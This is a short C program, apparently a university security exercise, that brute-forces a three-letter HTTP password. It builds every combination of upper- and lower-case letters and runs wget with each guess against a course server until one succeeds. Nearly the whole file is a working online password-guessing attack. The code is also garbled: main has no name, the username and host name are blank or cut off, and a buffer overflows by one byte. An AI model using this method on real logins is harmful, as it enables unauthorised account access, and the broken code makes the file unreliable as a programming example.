

#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <ctype.h>
#define OneBillion 1e9 

int (){
   int i=65,j=65,k=65,count=0,res=1;
   char arry[3],send[100];
   int startTime, stopTime, final;
   startTime = time();
   for(i;i<123;i++){
      if(i<91 || i>96){
         arry[0]=i;
	 j=65;
	 for(j;j<123;j++){
	    if(j<91 || j>96){
	       arry[1]=j;
	       k=65;
	       for(k;k<123;k++){
		  if(k<91 || k>96){
		     arry[2]=k;
		     arry[3]='\0';
		     strcpy(send,"wget --http-user= --http-passwd=");
		     strcat(send,arry);
		     strcat(send," http://sec-crack.cs.rmit.edu./SEC/2/");
		     count++;
	             if((res=(system(send)) == 0)) {
		        stopTime = time();
			final = stopTime-startTime;
			printf("\n THE PASSWORD IS = %s & TIME TAKEN =%lf seconds &  OF COMPARISIONs  = %d\n",arry,(double)final/OneBillion,count);
			exit(1);
		     }
		  }
	       }
            }
         }
      }
   }
   printf("\npassword not found\n");
   exit(1);
}
